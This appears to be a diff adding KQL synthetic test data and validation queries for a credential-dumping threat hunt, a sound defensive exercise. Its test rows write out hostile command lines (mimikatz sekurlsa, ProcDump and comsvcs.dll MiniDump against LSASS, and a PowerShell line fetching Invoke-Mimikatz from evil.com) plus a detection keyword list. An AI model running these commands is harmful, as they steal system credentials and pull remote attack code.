@@ -1,0 +1,148 @@
+// ============================================================================
+// Hunt 01: Credential Dumping - Synthetic Test Data
+// Use this to validate the detection query in your lab environment
+// ============================================================================
+
+// ============================================================================
+// SYNTHETIC TEST DATA - DeviceProcessEvents
+// ============================================================================
+let TestDeviceProcessEvents = datatable(
+    Timestamp: datetime,
+    DeviceName: string,
+    FileName: string,
+    ProcessCommandLine: string,
+    ProcessId: int,
+    InitiatingProcessFileName: string,
+    InitiatingProcessCommandLine: string,
+    InitiatingProcessFolderPath: string,
+    AccountName: string,
+    AccountDomain: string,
+    SHA256: string
+) [
+    // Test Case 1: Mimikatz execution (SHOULD DETECT - High)
+    datetime(2024-01-14 10:30:00), "WORKSTATION01", "mimikatz.exe", 
+    "mimikatz.exe sekurlsa::logonpasswords", 4521,
+    "cmd.exe", "cmd.exe /c mimikatz.exe", "C:\\Users\\attacker\\Downloads",
+    "attacker", "CONTOSO", "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2",
+    
+    // Test Case 2: ProcDump targeting LSASS (SHOULD DETECT - High)
+    datetime(2024-01-14 11:15:00), "WORKSTATION02", "procdump64.exe",
+    "procdump64.exe -accepteula -ma lsass.exe lsass.dmp", 5632,
+    "powershell.exe", "powershell.exe -ep bypass", "C:\\Windows\\System32",
+    "admin", "CONTOSO", "b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3",
+    
+    // Test Case 3: comsvcs.dll MiniDump (SHOULD DETECT - Critical)
+    datetime(2024-01-14 12:00:00), "SERVER01", "rundll32.exe",
+    "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\temp\\lsass.dmp full", 7845,
+    "cmd.exe", "cmd.exe", "C:\\Windows\\System32",
+    "svc_backup", "CONTOSO", "c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
+    
+    // Test Case 4: PowerShell Invoke-Mimikatz (SHOULD DETECT - Critical)
+    datetime(2024-01-14 13:30:00), "WORKSTATION03", "powershell.exe",
+    "powershell.exe -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"", 8912,
+    "explorer.exe", "explorer.exe", "C:\\Windows",
+    "user1", "CONTOSO", "d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5",
+    
+    // Test Case 5: Nanodump (SHOULD DETECT - High)
+    datetime(2024-01-14 14:45:00), "WORKSTATION04", "nanodump.exe",
+    "nanodump.exe --write C:\\temp\\lsass.dmp", 9123,
+    "cmd.exe", "cmd.exe /c nanodump.exe", "C:\\Users\\attacker\\Desktop",
+    "attacker2", "CONTOSO", "e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6",
+    
+    // Test Case 6: Legitimate Windows Defender (SHOULD NOT DETECT - False Positive)
+    datetime(2024-01-14 15:00:00), "WORKSTATION01", "MsMpEng.exe",
+    "MsMpEng.exe", 1234,
+    "services.exe", "services.exe", "C:\\Program Files\\Windows Defender",
+    "SYSTEM", "NT AUTHORITY", "f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1",
+    
+    // Test Case 7: Legitimate svchost (SHOULD NOT DETECT - False Positive)
+    datetime(2024-01-14 15:30:00), "SERVER01", "svchost.exe",
+    "svchost.exe -k netsvcs", 892,
+    "services.exe", "services.exe", "C:\\Windows\\System32",
+    "SYSTEM", "NT AUTHORITY", "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2",
+    
+    // Test Case 8: SQLDumper targeting LSASS (SHOULD DETECT - High)
+    datetime(2024-01-14 16:00:00), "SQLSERVER01", "sqldumper.exe",
+    "sqldumper.exe 672 0 0x01100:40", 10234,
+    "cmd.exe", "cmd.exe", "C:\\Program Files\\Microsoft SQL Server",
+    "sql_admin", "CONTOSO", "b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3"
+];
+
+// ============================================================================
+// SYNTHETIC TEST DATA - DeviceFileEvents (for Task Manager dump detection)
+// ============================================================================
+let TestDeviceFileEvents = datatable(
+    Timestamp: datetime,
+    DeviceName: string,
+    FileName: string,
+    FolderPath: string,
+    InitiatingProcessFileName: string,
+    InitiatingProcessCommandLine: string,
+    InitiatingProcessAccountName: string
+) [
+    // Test Case 9: Task Manager LSASS dump (SHOULD DETECT - High)
+    datetime(2024-01-14 17:00:00), "WORKSTATION05", "lsass.DMP",
+    "C:\\Users\\admin\\AppData\\Local\\Temp", "taskmgr.exe",
+    "taskmgr.exe", "admin",
+    
+    // Test Case 10: Legitimate crash dump (SHOULD NOT DETECT)
+    datetime(2024-01-14 17:30:00), "WORKSTATION01", "WER12345.tmp.dmp",
+    "C:\\ProgramData\\Microsoft\\Windows\\WER", "WerFault.exe",
+    "WerFault.exe -u -p 1234", "SYSTEM"
+];
+
+// ============================================================================
+// RUN DETECTION QUERY AGAINST TEST DATA
+// ============================================================================
+
+// Replace DeviceProcessEvents with TestDeviceProcessEvents in the main query
+// to validate detections
+
+// Expected Results:
+// - Test Cases 1-5, 8: SHOULD BE DETECTED (credential dumping attempts)
+// - Test Cases 6-7: SHOULD NOT BE DETECTED (legitimate processes)
+// - Test Case 9: SHOULD BE DETECTED (Task Manager dump)
+// - Test Case 10: SHOULD NOT BE DETECTED (legitimate crash dump)
+
+// ============================================================================
+// VALIDATION QUERY
+// ============================================================================
+TestDeviceProcessEvents
+| where FileName in~ ("mimikatz.exe", "procdump64.exe", "nanodump.exe", "sqldumper.exe")
+    or ProcessCommandLine has_any ("sekurlsa", "MiniDump", "comsvcs", "Invoke-Mimikatz")
+| extend 
+    ExpectedDetection = true,
+    DetectionReason = case(
+        FileName =~ "mimikatz.exe", "Known credential dumping tool",
+        FileName =~ "procdump64.exe" and ProcessCommandLine has "lsass", "ProcDump targeting LSASS",
+        ProcessCommandLine has "comsvcs" and ProcessCommandLine has "MiniDump", "LOTL via comsvcs.dll",
+        ProcessCommandLine has "Invoke-Mimikatz", "PowerShell credential dumping",
+        FileName =~ "nanodump.exe", "Known credential dumping tool",
+        FileName =~ "sqldumper.exe", "SQLDumper abuse",
+        "Other suspicious activity"
+    )
+| project 
+    Timestamp,
+    DeviceName,
+    FileName,
+    ProcessCommandLine,
+    AccountName,
+    ExpectedDetection,
+    DetectionReason
+| order by Timestamp asc
+
+// ============================================================================
+// FALSE POSITIVE VALIDATION
+// ============================================================================
+// These should NOT trigger detections:
+TestDeviceProcessEvents
+| where FileName in~ ("MsMpEng.exe", "svchost.exe")
+| extend 
+    ExpectedDetection = false,
+    Reason = "Legitimate Windows process"
+| project 
+    Timestamp,
+    DeviceName,
+    FileName,
+    ExpectedDetection,
+    Reason
